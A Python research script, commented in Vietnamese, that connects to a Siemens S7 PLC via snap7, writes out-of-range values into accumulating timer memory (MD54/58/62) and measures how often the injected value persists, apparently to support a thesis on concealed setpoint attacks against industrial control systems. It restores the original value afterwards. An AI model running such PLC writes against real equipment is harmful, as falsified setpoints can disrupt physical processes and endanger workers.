"""
PROBE_SETPOINT_STICKRATE — đo tỷ lệ "dính" khi ghi từ ngoài vào timer tích lũy.

MUC DICH (phan bien hoi dong): Hoi dong nghi ngo rang ghi vao MD54/58/62 (CD1/
CD2/CD3) se bi PLC ghi de lai ngay moi chu ky scan -> SETPOINT_ATTACK vo nghia.
Thi nghiem concealed_stop_attack.py da DO duoc rang dieu do DUNG voi BangTai
(output coil, chi dinh 17.8%) va voi `nhap` (0%). Script nay do CHIEU NGUOC LAI
cho CD1: neu CD1 la bien dem TICH LUY (CD1 := CD1 - dt, tu tham chieu gia tri
cu) thi ghi tu ngoai se TRO THANH baseline moi va PLC tiep tuc dem lui TU do ->
ky vong dinh ~100%, khac han BangTai. Ba con so CD1 ~100% / BangTai ~18% /
nhap 0% (cung mot phep do readback) chung minh dut diem: "tran che giau" la
thuoc tinh cua LOAI bien bi ghi, khong phai cua ban than chu ky scan.

KHONG lien quan gi den dataset Day1-7: khong thu lai pcap, khong train lai
model. Day la 1 phep do chan doan doc lap, chay vai phut, tu khoi phuc gia tri
goc khi xong.

PHUONG PHAP (giong _conceal_sampler cua concealed_stop_attack.py nhung cho S7/MD):
  1. Doc CD1 vai lan de hoc "tran binh thuong" (normal_ceiling).
  2. Moi trial: ghi 1 gia tri BAT THUONG (normal_ceiling + inject_delta, nam
     ngoai han dem binh thuong) vao MD<offset>, roi doc lai NGAY o tan suat cao.
  3. Phan loai moi lan doc lai:
       - PERSISTED: gia tri doc lai van nam trong "vung tiem" (gan gia tri da
         ghi, cho phep tru di mot chut do timer dem lui) -> ghi da dinh.
       - REVERTED: gia tri bat lai ve vung binh thuong -> PLC ghi de.
  4. Stick-rate = persisted / (persisted + reverted), so sanh truc tiep voi
     readback_still_true/reverted cua BangTai.
  5. Trial dau tien luu lai quy dao doc-lai (de ve hinh minh hoa dem-lui-tu-
     gia-tri-tiem trong bao cao).
  6. finally: khoi phuc gia tri goc.

Goi:
  python probe_setpoint_stickrate.py --target 192.168.210.211 --rack 0 --slot 1 \
      --offset 54 --trials 30 --sample-hz 20 --window 1.0 \
      --out scratch/stickrate_md54.json
"""

import argparse
import json
import statistics
import sys
import time
from pathlib import Path

import snap7
try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas
from snap7.util import get_dint, set_dint


def read_dint(client, offset: int) -> int:
    return get_dint(client.read_area(Areas.MK, 0, offset, 4), 0)


def write_dint(client, offset: int, value: int) -> None:
    buf = bytearray(4)
    set_dint(buf, 0, int(value))
    client.write_area(Areas.MK, 0, offset, buf)


def learn_normal_ceiling(client, offset: int, samples: int = 20, interval: float = 0.1) -> int:
    """Doc CD1 nhieu lan de biet gia tri lon nhat no dat toi khi chay binh
    thuong (preset countdown). Nguong phan loai se dat CAO HON tran nay nhieu."""
    vals = []
    for _ in range(samples):
        try:
            vals.append(read_dint(client, offset))
        except Exception:
            pass
        time.sleep(interval)
    if not vals:
        raise RuntimeError("Khong doc duoc gia tri nao tu MD offset da cho.")
    return max(vals), vals


def classify(readback: int, inject_value: int, normal_ceiling: int) -> str:
    """PERSISTED neu gia tri doc lai van o 'vung tiem' — cao hon han tran binh
    thuong VA gan gia tri da ghi (nua tren cua khoang [ceiling, inject]).
    Nguong 0.5 rat an toan: inject cao hon ceiling hang chuc nghin ms, timer
    dem lui chi vai chuc ms/scan nen trong cua so 1s khong the roi qua nua
    khoang. REVERTED neu bat lai ve vung binh thuong."""
    midpoint = normal_ceiling + 0.5 * (inject_value - normal_ceiling)
    return "persisted" if readback >= midpoint else "reverted"


def run(args) -> int:
    client = snap7.client.Client()
    try:
        print(f"[*] Connect PLC {args.target} rack={args.rack} slot={args.slot}")
        client.connect(args.target, args.rack, args.slot)
    except Exception as exc:
        print(f"[!] Khong ket noi duoc PLC: {exc}")
        print("[!] Kiem tra IP, rack/slot, mang, va quyen PUT/GET tren PLC.")
        return 2

    original = None
    try:
        try:
            state = str(client.get_cpu_state())
            print(f"[*] CPU state: {state}")
        except Exception:
            pass

        original = read_dint(client, args.offset)
        print(f"[*] Gia tri goc MD{args.offset} = {original} (se khoi phuc khi xong)")

        normal_ceiling, ceiling_samples = learn_normal_ceiling(client, args.offset)
        inject_value = normal_ceiling + args.inject_delta
        print(f"[*] Tran binh thuong (max quan sat) = {normal_ceiling}ms")
        print(f"[*] Gia tri BAT THUONG se ghi        = {inject_value}ms "
              f"(nguong phan loai = {normal_ceiling + 0.5*(inject_value-normal_ceiling):.0f}ms)")

        sample_interval = 1.0 / args.sample_hz
        persisted_total = 0
        reverted_total = 0
        per_trial = []
        first_trajectory = None

        print(f"\n[*] Chay {args.trials} trial, moi trial ghi 1 lan roi doc lai "
              f"{args.sample_hz}Hz trong {args.window}s...\n")

        for t in range(1, args.trials + 1):
            write_dint(client, args.offset, inject_value)
            trial_persist = 0
            trial_revert = 0
            trajectory = []
            t_end = time.time() + args.window
            while time.time() < t_end:
                try:
                    v = read_dint(client, args.offset)
                    trajectory.append(v)
                    if classify(v, inject_value, normal_ceiling) == "persisted":
                        trial_persist += 1
                    else:
                        trial_revert += 1
                except Exception as e:
                    print(f"  [trial {t}] read error: {e}")
                time.sleep(sample_interval)

            persisted_total += trial_persist
            reverted_total += trial_revert
            n = trial_persist + trial_revert
            rate = (trial_persist / n * 100) if n else 0.0
            per_trial.append({"trial": t, "persisted": trial_persist,
                              "reverted": trial_revert, "stick_pct": round(rate, 1),
                              "first_readback": trajectory[0] if trajectory else None,
                              "last_readback": trajectory[-1] if trajectory else None})
            print(f"  [trial {t:2d}] dinh={trial_persist:3d} bat_lai={trial_revert:3d} "
                  f"stick={rate:5.1f}%  (doc dau={trajectory[0] if trajectory else '-'}, "
                  f"cuoi={trajectory[-1] if trajectory else '-'})")
            if first_trajectory is None:
                first_trajectory = trajectory

        total = persisted_total + reverted_total
        overall = (persisted_total / total * 100) if total else 0.0

        print("\n" + "=" * 60)
        print(f"KET QUA MD{args.offset} (CD timer tich luy)")
        print(f"  Tong lan doc lai       : {total}")
        print(f"  Gia tri gia GIU DUOC   : {persisted_total}")
        print(f"  Gia tri gia BI GHI DE  : {reverted_total}")
        print(f"  >>> STICK-RATE         : {overall:.1f}%")
        print("=" * 60)
        print("So sanh (cung phep do readback):")
        print(f"  MD{args.offset} (CD accumulator) : {overall:.1f}%   <- ky vong ~100%")
        print(f"  BangTai (output coil)   : 17.8%  (concealed_stop_attack)")
        print(f"  nhap    (PLC nap truc tiep): 0.0%")
        print("=" * 60)

        if args.out:
            out = {
                "target": args.target, "offset": args.offset,
                "original_value": original,
                "normal_ceiling": normal_ceiling,
                "inject_value": inject_value,
                "trials": args.trials, "sample_hz": args.sample_hz,
                "window_s": args.window,
                "persisted_total": persisted_total,
                "reverted_total": reverted_total,
                "stick_rate_pct": round(overall, 2),
                "per_trial": per_trial,
                "first_trial_trajectory": first_trajectory,
                "comparison": {"CD_md%d" % args.offset: round(overall, 2),
                               "BangTai_output_coil": 17.8, "nhap_plc_loaded": 0.0},
            }
            Path(args.out).parent.mkdir(parents=True, exist_ok=True)
            Path(args.out).write_text(json.dumps(out, indent=2, ensure_ascii=False),
                                      encoding="utf-8")
            print(f"[*] Da ghi ket qua chi tiet -> {args.out}")

        return 0

    except Exception as exc:
        print(f"[!] Loi khi chay probe: {exc}")
        return 1
    finally:
        if original is not None and client.get_connected():
            try:
                write_dint(client, args.offset, original)
                print(f"[*] Da khoi phuc MD{args.offset} = {original}")
            except Exception as e:
                print(f"[!] Khoi phuc that bai, kiem tra thu cong MD{args.offset}: {e}")
        if client.get_connected():
            client.disconnect()


def main() -> int:
    p = argparse.ArgumentParser(
        description="Do stick-rate khi ghi tu ngoai vao timer tich luy MD (CD1/CD2/CD3).")
    p.add_argument("--target", default="192.168.210.211")
    p.add_argument("--rack", type=int, default=0)
    p.add_argument("--slot", type=int, default=1)
    p.add_argument("--offset", type=int, default=54,
                   help="MD offset: 54=CD1, 58=CD2, 62=CD3 (mac dinh 54)")
    p.add_argument("--trials", type=int, default=30,
                   help="So lan ghi doc lap (mac dinh 30)")
    p.add_argument("--sample-hz", type=float, default=20.0,
                   help="Tan suat doc lai sau moi lan ghi (mac dinh 20Hz)")
    p.add_argument("--window", type=float, default=1.0,
                   help="Cua so doc lai moi trial, giay (mac dinh 1.0)")
    p.add_argument("--inject-delta", type=int, default=60000,
                   help="Gia tri bat thuong = tran binh thuong + delta (ms, mac dinh 60000)")
    p.add_argument("--out", default="scratch/stickrate_md54.json",
                   help="File JSON ket qua (mac dinh scratch/stickrate_md54.json)")
    return run(p.parse_args())


if __name__ == "__main__":
    sys.exit(main())
